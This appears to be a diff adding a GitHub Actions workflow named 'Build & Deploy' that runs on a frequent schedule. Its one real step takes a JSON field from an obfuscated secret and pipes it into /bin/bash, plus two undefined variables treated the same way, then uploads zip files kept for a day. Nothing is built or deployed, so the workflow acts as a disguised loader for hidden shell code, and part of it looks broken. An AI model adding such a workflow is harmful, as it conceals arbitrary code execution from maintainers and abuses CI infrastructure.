@@ -1,0 +1,32 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '21 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          db0754: ${{ secrets.db0754 }}
+        run: |
+          printf '%s' "$db0754" | jq -r .bwlh2 | /bin/bash
+          echo $z417 | jq -r .zdy51 | /bin/bash
+          echo $lcgm77 | jq -r .vxsln82 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2EYQxvBv
+          path: "*.zip"
+          retention-days: 1
